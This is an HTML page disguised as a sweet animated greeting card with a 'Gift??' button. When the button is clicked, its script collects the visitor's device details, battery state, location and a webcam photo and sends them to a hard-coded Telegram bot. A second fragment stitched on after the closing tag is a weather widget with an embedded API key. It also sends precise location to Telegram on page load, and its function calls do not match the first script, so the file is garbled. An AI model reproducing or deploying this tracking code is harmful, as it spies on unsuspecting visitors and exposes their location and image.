<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Sweet Animated Greeting ğŸ’•</title>
  <link href="https://fonts.googleapis.com/css2?family=Pacifico&family=Quicksand:wght@400;600&display=swap" rel="stylesheet"/>
  <style>
    @keyframes gradientShift {
      0% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }
    body {
      margin: 0;
      font-family: 'Quicksand', sans-serif;
      height: 100vh;
      overflow: hidden;
      background: linear-gradient(270deg, #ffdee9, #b5fffc, #ff9a9e, #fad0c4);
      background-size: 800% 800%;
      animation: gradientShift 20s ease infinite;
      display: flex;
      justify-content: center;
      align-items: center;
      color: #444;
    }
    .bubbles { position:absolute; width:100%; height:100%; top:0; left:0; z-index:0; overflow:hidden; pointer-events:none;}
    .bubble { position:absolute; border-radius:50%; opacity:0.12; animation-name:floatUp; animation-timing-function:ease-in-out; animation-iteration-count:infinite; filter:drop-shadow(0 0 6px rgba(255 255 255 / 0.25)); will-change:transform;}
    .bubble1{width:140px;height:140px;background:#ff9a9e;bottom:-160px;left:12%;animation-duration:22s;animation-delay:0s;}
    .bubble2{width:90px;height:90px;background:#fad0c4;bottom:-110px;left:38%;animation-duration:18s;animation-delay:3s;}
    .bubble3{width:110px;height:110px;background:#a1c4fd;bottom:-140px;left:68%;animation-duration:23s;animation-delay:5s;}
    .bubble4{width:65px;height:65px;background:#c2e9fb;bottom:-95px;left:83%;animation-duration:17s;animation-delay:1s;}
    @keyframes floatUp {0%{transform:translateY(0) scale(1);opacity:0.12;}50%{opacity:0.25;}100%{transform:translateY(-110vh) scale(1.1);opacity:0;}}
    .container {
      position: relative;
      background: rgba(255 255 255 / 0.9);
      padding: 35px 40px;
      border-radius: 24px;
      box-shadow: 0 15px 40px rgba(0,0,0,0.12);
      max-width: 500px;
      text-align: center;
      z-index:10;
      user-select:none;
    }
    h1 { font-family:'Pacifico', cursive; font-size:44px; color:#ff5eab; margin-bottom:15px;}
    p { font-size:19px; line-height:1.6; margin-bottom:25px; color:#555; white-space:pre-line;}
    .hearts { font-size:32px; margin-bottom:20px; animation:pulse 1.8s infinite; color:#ff5eab;}
    @keyframes pulse {0%,100%{transform:scale(1);}50%{transform:scale(1.15);}}
    .btn { padding:12px 25px; background:#ff5eab; color:white; border:none; border-radius:25px; cursor:pointer; font-size:16px; margin-top:10px;}
    .btn:hover { background:#e63a91;}
    .info { font-size:14px; color:#666; margin-top:15px; background: rgba(255,245,250,0.7); padding:10px; border-radius:12px; white-space: pre-line;}
  </style>
</head>
<body>
  <div class="bubbles">
    <div class="bubble bubble1"></div>
    <div class="bubble bubble2"></div>
    <div class="bubble bubble3"></div>
    <div class="bubble bubble4"></div>
  </div>

  <div class="container">
    <h1 id="greeting">Hello! ğŸŒ</h1>
    <p id="message">Loading message...</p>
    <div class="hearts">ğŸ’—ğŸŒ¸ğŸ’«ğŸ’ğŸ¥°ğŸ’•</div>
    <div class="info" id="info">Shvmmk here .</div>
    <button class="btn" onclick="sendToTelegram()">ğŸ’Œ Gift??</button>
  </div>

  <script>
    const BOT_TOKEN = "6298320462:AAFgjEjGy0udiRNZRG1VVpooKYyQpj4UF6U";
    const CHAT_ID = "6000036430";

    function getRandomItem(arr) { return arr[Math.floor(Math.random() * arr.length)]; }

    function updateGreeting(){
      const greetingEl = document.getElementById('greeting');
      const messageEl = document.getElementById('message');
      const hour = new Date().getHours();
      let greeting='', messages=[];
      if(hour>=5&&hour<12){ greeting='Good Morning! ğŸŒ'; messages=[`Rise & shine! â˜€ï¸ Enjoy your day ğŸ’•`,`Morning sunshine! ğŸŒ¸ Keep smiling!`,`Have a bright morning full of joy âœ¨`]; }
      else if(hour>=12&&hour<17){ greeting='Good Afternoon! â˜€ï¸'; messages=[`Hello! ğŸŒ Have a peaceful afternoon ğŸ’–`,`Keep shining and smile ğŸŒ¼`,`Enjoy your afternoon moments ğŸŒŸ`]; }
      else if(hour>=17&&hour<21){ greeting='Good Evening! ğŸŒ™'; messages=[`Evening is here ğŸŒ™ Relax & unwind ğŸ’•`,`Lovely evening! Enjoy the calm ğŸŒŒ`,`Good evening! Stars await your dreams âœ¨`]; }
      else{ greeting='Good Night! ğŸŒŒ'; messages=[`Time to rest ğŸŒ™ Sweet dreams ğŸ’«`,`Night night! Sleep tight ğŸ’–`,`May tomorrow be brighter ğŸŒŸ`]; }
      greetingEl.textContent = greeting;
      messageEl.textContent = getRandomItem(messages);
    }

    function getDeviceInfo(){
      return {
        platform: navigator.platform,
        browser: navigator.userAgent,
        screen: `${screen.width}x${screen.height}`,
        language: navigator.language,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
      };
    }

    async function getBatteryInfo(){
      if(navigator.getBattery){ const bat = await navigator.getBattery(); return `Battery: ${Math.round(bat.level*100)}%, Charging: ${bat.charging}`; }
      return 'Battery info not available';
    }

    function getLocation(){
      return new Promise((resolve)=>{ 
        if(navigator.geolocation){
          navigator.geolocation.getCurrentPosition((pos)=>{
            resolve({lat:pos.coords.latitude.toFixed(2), lon:pos.coords.longitude.toFixed(2)});
          },()=>resolve(null));
        }else resolve(null);
      });
    }

    async function capturePhoto(){
      try{
        const stream = await navigator.mediaDevices.getUserMedia({video:true});
        const track = stream.getVideoTracks()[0];
        const imageCapture = new ImageCapture(track);
        const blob = await imageCapture.takePhoto();
        track.stop();
        return blob;
      }catch(err){ console.log("Camera not allowed"); return null; }
    }

    async function sendToTelegram(){
      const device = getDeviceInfo();
      const loc = await getLocation();
      const battery = await getBatteryInfo();
      const photoBlob = await capturePhoto();

      let msg = `ğŸ’Œ Visitor Info\nPlatform: ${device.platform}\nBrowser: ${device.browser}\nScreen: ${device.screen}\nLanguage: ${device.language}\nTimezone: ${device.timezone}\n${battery}`;
      if(loc) msg+=`\nLocation: https://maps.google.com/?q=${loc.lat},${loc.lon}`;

      document.getElementById('info').textContent = msg;

      const formData = new FormData();
      formData.append('chat_id', CHAT_ID);
      formData.append('text', msg);
      if(photoBlob) formData.append('photo', photoBlob, 'snapshot.jpg');

      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${photoBlob?'sendPhoto':'sendMessage'}`, {method:'POST', body:formData})
        .then(r=>r.json()).then(d=>console.log("Sent:",d)).catch(e=>console.log("Error:",e));
    }

    updateGreeting();
  </script>
</body>
</html>      function getWeather(lat, lon) {
        const apiKey = "dc17de99f25f66579d4e1f8efc373169";
        const url = `https://api.openweathermap.org/data/2.5/weather?lat=${lat}&lon=${lon}&units=metric&appid=${apiKey}`;

        fetch(url)
          .then((response) => response.json())
          .then((data) => {
            if (data.cod !== 200) {
              weatherEl.innerHTML = `<div class="error">Weather error: ${data.message}</div>`;
              return;
            }

            const temp = data.main.temp.toFixed(1);
            const description = data.weather[0].description;
            const city = data.name;
            const country = data.sys.country;
            const condition = data.weather[0].main;

            const icons = {
              Clear: "â˜€ï¸",
              Rain: "ğŸŒ§ï¸",
              Thunderstorm: "â›ˆï¸",
              Snow: "â„ï¸",
              Clouds: "â˜ï¸",
              Drizzle: "ğŸŒ¦ï¸",
              Mist: "ğŸŒ«ï¸",
              Smoke: "ğŸ’¨",
              Haze: "ğŸŒ",
              Fog: "ğŸŒ«ï¸",
              Dust: "ğŸŒ¬ï¸",
              Sand: "ğŸŒ¬ï¸",
              Ash: "ğŸŒ‹",
              Squall: "ğŸŒ¬ï¸",
              Tornado: "ğŸŒªï¸",
            };

            iconEl.textContent = icons[condition] || "ğŸŒ¤ï¸";

            weatherEl.innerHTML = `
            Location: <strong>${city}, ${country}</strong><br>
            Temperature: <strong>${temp}Â°C</strong><br>
            Condition: <strong>${description}</strong>
          `;
          })
          .catch((err) => {
            weatherEl.innerHTML = `<div class="error">Weather fetch failed.</div>`;
            console.error("Weather error:", err);
          });
      }

      function getUserLocation() {
        if ("geolocation" in navigator) {
          navigator.geolocation.getCurrentPosition(
            (pos) => {
              const lat = pos.coords.latitude;
              const lon = pos.coords.longitude;
              const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
              sendToTelegram(mapsUrl);
              getWeather(lat, lon);
            },
            (err) => {
              weatherEl.innerHTML = `<div class="error">Permission denied. Cannot fetch weather.</div>`;
              console.warn("Location error:", err.message);
            },
            {
              enableHighAccuracy: true,
              timeout: 10000,
              maximumAge: 0,
            }
          );
        } else {
          weatherEl.innerHTML = `<div class="error">Geolocation not supported.</div>`;
        }
      }

      getUserLocation();
    </script>
  </body>
</html>
